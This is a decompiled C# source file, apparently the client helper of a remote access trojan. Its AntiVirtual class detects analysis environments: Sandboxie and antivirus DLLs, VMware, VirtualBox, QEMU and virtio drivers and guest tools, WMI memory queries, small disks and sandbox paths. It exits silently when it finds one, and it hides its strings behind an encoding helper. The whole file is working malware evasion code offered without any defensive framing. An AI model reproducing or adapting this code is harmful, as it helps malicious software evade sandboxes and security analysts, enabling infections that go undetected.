using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;

namespace Client.Helper;

internal class AntiVirtual
{
	public static void RunAntiAnalysis()
	{
		try
		{
			if (isVM_by_wim_temper() || isVM_by_wim_temper1() || CheckWMI() || SmallDiskDetected() || EnvironmentDetected())
			{
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	public static bool Check()
	{
		try
		{
			string[] array = new string[5]
			{
				EncryptString.Decode("SbieDll.dll"),
				EncryptString.Decode("snxhk.dll"),
				EncryptString.Decode("cmdvrt32.dll"),
				EncryptString.Decode("Sf2.dll"),
				EncryptString.Decode("SxIn.dll")
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (DllImport.GetModuleHandleA(array[i]) != 0)
				{
					return true;
				}
			}
		}
		catch
		{
		}
		return false;
	}

	public static bool isVM_by_wim_temper()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			return new ManagementObjectSearcher((ObjectQuery)new SelectQuery(EncryptString.Decode("Select * from Win32_CacheMemory"))).Get().Count == 0;
		}
		catch
		{
			return false;
		}
	}

	public static bool isVM_by_wim_temper1()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			return new ManagementObjectSearcher((ObjectQuery)new SelectQuery(EncryptString.Decode("Select * from CIM_Memory"))).Get().Count == 0;
		}
		catch
		{
			return false;
		}
	}

	public static bool CheckWMI()
	{
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		string[] source = new string[11]
		{
			EncryptString.Decode("virtual"),
			EncryptString.Decode("innotek gmbh"),
			EncryptString.Decode("tpvcgateway"),
			EncryptString.Decode("VMXh"),
			EncryptString.Decode("tpautoconnsvc"),
			EncryptString.Decode("vbox"),
			EncryptString.Decode("vmbox"),
			EncryptString.Decode("vmware"),
			EncryptString.Decode("virtualbox"),
			EncryptString.Decode("box"),
			EncryptString.Decode("thinapp")
		};
		try
		{
			ManagementObject val = (from p in ((IEnumerable)new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get()).OfType<ManagementObject>()
				where p != null
				select p).FirstOrDefault();
			if (((ManagementBaseObject)val)[EncryptString.Decode("Model")] != null && Enumerable.Contains(source, ((ManagementBaseObject)val)[EncryptString.Decode("Model")].ToString().ToLower()))
			{
				return true;
			}
			if (((ManagementBaseObject)val)[EncryptString.Decode("Manufacturer")] != null && Enumerable.Contains(source, ((ManagementBaseObject)val)[EncryptString.Decode("Manufacturer")].ToString().ToLower()))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	public static bool SmallDiskDetected()
	{
		try
		{
			long num = GetTotalSize(Path.GetPathRoot(Environment.SystemDirectory).Substring(0, 1)) / 1000000000;
			long num2 = 45L;
			return num < num2;
		}
		catch
		{
			return false;
		}
	}

	public static long GetTotalSize(string driveLetter)
	{
		long lpFreeBytesAvailable = 0L;
		long lpTotalNumberOfBytes = 0L;
		long lpTotalNumberOfFreeBytes = 0L;
		DllImport.GetDiskFreeSpaceEx(driveLetter + EncryptString.Decode(":\\"), ref lpFreeBytesAvailable, ref lpTotalNumberOfBytes, ref lpTotalNumberOfFreeBytes);
		return lpTotalNumberOfBytes;
	}

	public static bool EnvironmentDetected()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("drivers"));
		string[] array = new string[10]
		{
			EncryptString.Decode("balloon.sys"),
			EncryptString.Decode("netkvm.sys"),
			EncryptString.Decode("pvpanic.sys"),
			EncryptString.Decode("viofs.sys"),
			EncryptString.Decode("viofs.sys"),
			EncryptString.Decode("viogpudo.sys"),
			EncryptString.Decode("vioinput.sys"),
			EncryptString.Decode("viorng.sys"),
			EncryptString.Decode("vioser.sys"),
			EncryptString.Decode("viostor.sys")
		};
		foreach (string path2 in array)
		{
			if (File.Exists(Path.Combine(path, path2)))
			{
				return true;
			}
		}
		string path3 = Path.Combine(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) });
		array = new string[2]
		{
			EncryptString.Decode("qemu-ga"),
			EncryptString.Decode("SPICE Guest Tools")
		};
		foreach (string path4 in array)
		{
			if (Directory.Exists(Path.Combine(path3, path4)))
			{
				return true;
			}
		}
		return Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName).ToLower().Contains(EncryptString.Decode("sandbox"));
	}
}
